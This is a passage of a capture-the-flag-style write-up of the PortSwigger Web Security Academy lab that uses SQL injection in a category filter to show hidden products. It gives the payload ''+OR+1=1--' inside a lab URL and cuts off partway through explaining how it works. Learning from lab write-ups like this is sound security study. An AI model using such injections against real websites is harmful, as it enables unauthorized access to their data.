# SQL Injection - WHERE Clause to Retrieve Hidden Data

**Platform:** PortSwigger Web Security Academy  
**Category:** Web / SQL Injection  
**Level:** Apprentice  
**Date:** 27.10.2026  
**Status:** ✅ Solved  
**Lab Link:** https://0ad2005704a00be080518a4100da0024.web-security-academy.net/

---

## 1. Objective
Given a site with SQLi vulnerability and an explanation of how SQL works with categories on the site (SELECT * FROM products WHERE category = 'Gifts' AND released = 1), the goal is to see hidden products (1 or more)

## 2. Reconnaissance
- Accessed the site and saw the category selection section

## 3. Exploitation

1. Navigated to the 'Accessories' category
2. Added "'+OR+1=1--" to the URL
3. The site showed all products

**Payloads:**
```text
Original URL: https://0ad2005704a00be080518a4100da0024.web-security-academy.net/filter?category=Accessories
Injection: '+OR+1=1--
Modified URL: 'https://0ad2005704a00be080518a4100da0024.web-security-academy.net/filter?category=Accessories%27+OR+1=1--'
```

**Why it worked:**  
Knowing how the original SQL code looked, I added an injection to the 'category' parameter value (OR 1=1 - to make the injection work in any case, '--' - to make the 'released=1'
